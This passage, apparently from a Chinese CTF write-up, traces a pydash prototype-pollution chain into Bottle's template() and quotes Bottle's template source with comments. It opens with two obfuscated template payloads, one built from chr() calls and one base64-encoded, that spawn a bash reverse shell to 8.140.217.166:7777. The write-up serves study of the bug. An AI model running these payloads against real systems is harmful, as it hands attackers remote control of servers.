operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">118</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>or</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">from</span> os <span class="token keyword">import</span> system   <span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token punctuation">,</span> b64decode    system<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span><span class="token string">'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0MC4yMTcuMTY2Lzc3NzcgMD4mMSI='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>预期：</p><p><a href="file:///D:/Downloads/Pydash原型链污染链子分析.pdf">Pydash原型链污染链子分析.pdf</a></p><p>主要是这里：</p><p><a href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">Pydash 原型链污染</a></p><p><a href="https://blog.abdulrah33m.com/prototype-pollution-in-python/">Prototype Pollution in Python - Abdulrah33m’s Blog</a></p><p>用post(‘/setValue’)+get(‘/render’)</p><p>主要是这个set很危险哈哈：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>obj<span class="token punctuation">,</span>path<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>也就是说我们往name中传入一个对象，path中传入其属性名，values 传入更改的值就可以改掉其属性的值，例如这样</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pydash <span class="token keyword">class</span> <span class="token class-name">Apple</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"apple"</span> self<span class="token punctuation">.</span>sweet <span class="token operator">=</span> <span class="token number">10</span> a <span class="token operator">=</span> Apple<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>f"修改前<span class="token punctuation">:</span> <span class="token punctuation">{</span>a<span class="token punctuation">.</span>sweet<span class="token punctuation">}</span>"<span class="token punctuation">)</span> pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">"sweet"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>f"修改后<span class="token punctuation">:</span> <span class="token punctuation">{</span>a<span class="token punctuation">.</span>sweet<span class="token punctuation">}</span>"）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/36032fd2a705005b00c3eeba4b94d4ce.png"></p><p>而get(‘/render’)最后有<code>return bottle.template(path)</code>，so去找</p><p><a href="https://github.com/bottlepy/bottle/blob/master/bottle.py">bottle/bottle.py at master · bottlepy/bottle</a></p><p>belike</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">template</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Get a rendered template as a string iterator.    You can use a name, a filename or a template string as first parameter.    Template rendering arguments can be passed as dictionaries    or directly (as keyword arguments).    """</span>    tpl <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">if</span> args <span class="token keyword">else</span> <span class="token boolean">None</span>    <span class="token keyword">for</span> dictarg <span class="token keyword">in</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        kwargs<span class="token punctuation">.</span>update<span class="token punctuation">(</span>dictarg<span class="token punctuation">)</span>    adapter <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'template_adapter'</span><span class="token punctuation">,</span> SimpleTemplate<span class="token punctuation">)</span>    lookup <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'template_lookup'</span><span class="token punctuation">,</span> TEMPLATE_PATH<span class="token punctuation">)</span>    <span class="token comment">#here</span>    tplid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>lookup<span class="token punctuation">)</span><span class="token punctuation">,</span> tpl<span class="token punctuation">)</span>    <span class="token keyword">if</span> tplid <span class="token keyword">not</span> <span class="token keyword">in</span> TEMPLATES <span class="token keyword">or</span> DEBUG<span class="token punctuation">:</span><span class="token comment">#分析这里</span>        settings <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'template_settings'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span> adapter<span class="token punctuation">)</span><span class="token punctuation">:</span>            TEMPLATES<span class="token punctuation">[</span>tplid<span class="token punctuation">]</span> <span class="token operator">=</span> tpl            <span class="token keyword">if</span> settings<span class="token punctuation">:</span> TEMPLATES<span class="token punctuation">[</span>tplid<span class="token punctuation">]</span><span class="token punctuation">.</span>prepare<span class="token punctuation">(</span><span class="token operator">**</span>settings<span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token string">"\n"</span> <span class="token keyword">in</span> tpl <span class="token keyword">or</span> <span class="token string">"{"</span> <span class="token keyword">in</span> tpl <span class="token keyword">or</span> <span class="token string">"%"</span> <span class="token keyword">in</span> tpl <span class="token keyword">or</span> <span class="token string">'$'</span> <span class="token keyword">in</span> tpl<span class="token punctuation">:</span>            <span class="token comment">#如果 tpl 包含换行符 \n、花括号 {、百分号 % 或美元符号 $，则认为 tpl 是一个模板字符串。使用 adapter 创建一个新的模板实例，并将其放入 TEMPLATES 缓存中。</span>            TEMPLATES<span class="token punctuation">[</span>tplid<span class="token punctuation">]</span> <span class="token operator">=</span> adapter<span class="token punctuation">(</span>source<span class="token operator">=</span>tpl<span class="token punctuation">,</span> lookup<span class="token operator">=</span>lookup<span class="token punctuation">,</span> <span class="token operator">**</span>settings<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment">#否则，认为 tpl 是模板名称或文件名。使用 adapter 创建一个新的模板实例，并将其放入 TEMPLATES 缓存中。</span>            TEMPLATES<span class="token punctuation">[</span>tplid<span class="token punctuation">]</span> <span class="token operator">=</span> adapter<span class="token punctuation">(</span>name<span class="token operator">=</span>tpl<span class="token punctuation">,</span> lookup<span class="token operator">=</span>lookup<span class="token punctuation">,</span> <span class="token operator">**</span>settings<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> TEMPLATES<span class="token punctuation">[</span>tplid<span class="token punctuation">]</span><span class="token punctuation">:</span>        abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">'Template (%s) not found'</span> <span class="token operator">%</span> tpl<span class="token punctuation">)</span>    <span class="token keyword">return</span> TEMPLATES<span class="token punctuation">[</span>tplid<span class="token punctuation">]</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span>kwargs<span class="token punctuation">)</span>mako_template <span class="token operator">=</span> functools<span class="token punctuation">.</span>partial<span class="token punctuation">(</span>template<span class="token punctuation">,</span> template_adapter<span class="token operator">=</span>MakoTemplate<span class="token punctuation">)</span>cheetah_template <span class="token operator">=</span> functools<span class="token punctuation">.</span>partial<span class="token punctuation">(</span>template<span class="token punctuation">,</span>                                     template_adapter<span class="token operator">=</span>CheetahTemplate<span class="token punctuation">)</span>jinja2_template <span class="token operator">=</span> functools<span class="token punctuation">.</span>partial<span class="token punctuation">(</span>template<span class="token punctuation">,</span> template_adapter<span class="token operator">=</span>Jinja2Template<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>跟进这个解析器，然后因为后面传入的是name是一个path而不是一个 模板，所以会走到BaseTemplate这里先寻找并解析目录下的模板文件 再扔给SimpleTemplate进行渲染解析。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>lookup <span class="token operator">=</span> <span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> lookup<span class="token punctuation">]</span> <span class="token keyword">if</span> lookup <span class="token keyword">else</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认的模板引擎是SimpleTemplate，lookup就是模板的搜索 路径也就是 TEMPLATE_PATH  这个变量</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6b41fc32272f8a0d51d56ffdc4e6a157.png"></p><p>其默认的值为 ./ 和 ./views/</p><p>这两个字符串 <code>'./'</code> 和 <code>'./views/'</code> 通常代表文件路径，<code>'./'</code> 表示当前目录，<code>'./views/'</code> 表示当前目录下的 <code>views</code> 子目录。所以，<code>TEMPLATE_PATH = ['./', './views/']</code> 主要作用是定义一个模板文件的查找路径列表。</p><p>SimpleTemplate与BaseTemplate：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SimpleTemplate</span><span class="token punctuation">(</span>BaseTemplate<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""prepare 方法的主要作用是对模板进行初始化，设置缓存、字符编码、转义函数等，并根据 noescape 参数的值调整转义逻辑，同时记录模板的语法规则。这个方法的作用就是初始化模板的字符处理逻辑，支持 HTML 转义或直接输出原始 HTML，也就是解析这个传入的template变成html然后回到template结尾"""</span>    <span class="token keyword">def</span> <span class="token function">prepare</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>                escape_func<span class="token operator">=</span>html_escape<span class="token punctuation">,</span>                noescape<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>                syntax<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>ka<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        enc <span class="token operator">=</span> self<span class="token punctuation">.</span>encoding        self<span class="token punctuation">.</span>_str <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> touni<span class="token punctuation">(</span>x<span class="token punctuation">,</span> enc<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_escape <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> escape_func<span class="token punctuation">(</span>touni<span class="token punctuation">(</span>x<span class="token punctuation">,</span> enc<span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>syntax <span class="token operator">=</span> syntax        <span class="token keyword">if</span> noescape<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_str<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_escape <span class="token operator">=</span> self<span class="token punctuation">.</span>_escape<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_str    <span class="token decorator annotation punctuation">@cached_property</span>    <span class="token keyword">def</span> <span class="token function">co</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>code<span class="token punctuation">,</span> self<span class="token punctuation">.</span>filename <span class="token keyword">or</span> <span class="token string">'&lt;string&gt;'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@cached_property</span>    <span class="token keyword">def</span> <span class="token function">code</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> self<span class="token punctuation">.</span>source        <span class="token keyword">if</span> <span class="token keyword">not</span> source<span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                source <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            source<span class="token punctuation">,</span> encoding <span class="token operator">=</span> touni<span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span>        <span class="token keyword">except</span> UnicodeError<span class="token punctuation">:</span>            <span class="token keyword">raise</span> depr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token string">'Unsupported template encodings.'</span><span class="token punctuation">,</span> <span class="token string">'Use utf-8 for templates.'</span><span class="token punctuation">)</span>        parser <span class="token operator">=</span> StplParser<span class="token punctuation">(</span>source<span class="token punctuation">,</span> encoding<span class="token operator">=</span>encoding<span class="token punctuation">,</span> syntax<span class="token operator">=</span>self<span class="token punctuation">.</span>syntax<span class="token punctuation">)</span>        code <span class="token operator">=</span> parser<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>encoding <span class="token operator">=</span> parser<span class="token punctuation">.</span>encoding        <span class="token keyword">return</span> code    <span class="token keyword">def</span> <span class="token function">_rebase</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> _env<span class="token punctuation">,</span> _name<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        _env<span class="token punctuation">[</span><span class="token string">'_rebase'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>_name<span class="token punctuation">,</span> kwargs<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_include</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> _env<span class="token punctuation">,</span> _name<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        env <span class="token operator">=</span> _env<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>        env<span class="token punctuation">.</span>update<span class="token punctuation">(</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">if</span> _name <span class="token keyword">not</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>cache<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>cache<span class="token punctuation">[</span>_name<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span>name<span class="token operator">=</span>_name<span class="token punctuation">,</span> lookup<span class="token operator">=</span>self<span class="token punctuation">.</span>lookup<span class="token punctuation">,</span> syntax<span class="token operator">=</span>self<span class="token punctuation">.</span>syntax<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>cache<span class="token punctuation">[</span>_name<span class="token punctuation">]</span><span class="token punctuation">.</span>execute<span class="token punctuation">(</span>env<span class="token punctuation">[</span><span class="token string">'_stdout'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> env<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">execute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> _stdout<span class="token punctuation">,</span> kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        env <span class="token operator">=</span> self<span class="token punctuation">.</span>defaults<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>        env<span class="token punctuation">.</span>update<span class="token punctuation">(</span>kwargs<span class="token punctuation">)</span>        env<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token string">'_stdout'</span><span class="token punctuation">:</span> _stdout<span class="token punctuation">,</span>            <span class="token string">'_printlist'</span><span class="token punctuation">:</span> _stdout<span class="token punctuation">.</span>extend<span class="token punctuation">,</span>            <span class="token string">'include'</span><span class="token punctuation">:</span> functools<span class="token punctuation">.</span>partial<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_include<span class="token punctuation">,</span> env<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'rebase'</span><span class="token punctuation">:</span> functools<span class="token punctuation">.</span>partial<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_rebase<span class="token punctuation">,</span> env<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'_rebase'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span>            <span class="token string">'_str'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>_str<span class="token punctuation">,</span>            <span class="token string">'_escape'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>_escape<span class="token punctuation">,</span>            <span class="token string">'get'</span><span class="token punctuation">:</span> env<span class="token punctuation">.</span>get<span class="token punctuation">,</span>            <span class="token string">'setdefault'</span><span class="token punctuation">:</span> env<span class="token punctuation">.</span>setdefault<span class="token punctuation">,</span>            <span class="token string">'defined'</span><span class="token punctuation">:</span> env<span class="token punctuation">.</span>__contains__        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">exec</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>co<span class="token punctuation">,</span> env<span class="token punctuation">)</span>        <span class="token keyword">if</span> env<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'_rebase'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#如果模板调用 rebase(),继承父模板就递归渲染父模版.这个时候就会去读取environ模板文件</span>            subtpl<span class="token punctuation">,</span> rargs <span class="token operator">=</span> env<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'_rebase'</span><span class="token punctuation">)</span>            rargs<span class="token punctuation">[</span><span class="token string">'base'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>_stdout<span class="token punctuation">)</span>  <span class="token comment"># copy stdout</span>            <span class="token keyword">del</span> _stdout<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># clear stdout</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>_include<span class="token punctuation">(</span>env<span class="token punctuation">,</span> subtpl<span class="token punctuation">,</span> <span class="token operator">**</span>rargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> env    <span class="token keyword">def</span> <span class="token function">render</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">""" Render the template using keyword arguments as local variables. """</span>        env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        stdout <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> dictarg <span class="token keyword">in</span> args<span class="token punctuation">:</span>            env<span class="token punctuation">.</span>update<span class="token punctuation">(</span>dictarg<span class="token punctuation">)</span>        env<span class="token punctuation">.</span>update<span class="token punctuation">(</span>kwargs<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>stdout<span class="token punctuation">,</span> env<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">BaseTemplate</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">""" Base class and minimal API for template adapters """</span>    extensions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tpl'</span><span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'thtml'</span><span class="token punctuation">,</span> <span class="token string">'stpl'</span><span class="token punctuation">]</span>    settings <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># used in prepare()</span>    defaults <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># used in render()</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>                 source<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>                 name<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>                 lookup<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>                 encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">,</span> <span class="token operator">**</span>settings<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">""" Create a new template.        If the source parameter (str or buffer) is missing, the name argument        is used to guess a template filename. Subclasses can assume that        self.source and/or self.filename are set. Both are strings.        The lookup, encoding and settings parameters are stored as instance        variables.        The lookup parameter stores a list containing directory paths.        The encoding parameter should be used to decode byte strings or files.        The settings parameter contains a dict for engine-specific settings.        """</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token comment">#这里的name就是传入的bottle.template(path)的值</span>        self<span class="token punctuation">.</span>source <span class="token operator">=</span> source<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> source        self<span class="token punctuation">.</span>filename <span class="token operator">=</span> source<span class="token punctuation">.</span>filename <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>lookup <span class="token operator">=</span> <span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> lookup<span class="token punctuation">]</span> <span class="token keyword">if</span> lookup <span class="token keyword">else</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>encoding <span class="token operator">=</span> encoding        self<span class="token punctuation">.</span>settings <span class="token operator">=</span> self<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># Copy from class variable</span>        self<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>update<span class="token punctuation">(</span>settings<span class="token punctuation">)</span>  <span class="token comment"># Apply</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>source <span class="token keyword">and</span> self<span class="token punctuation">.</span>name<span class="token punctuation">:</span>            self<span 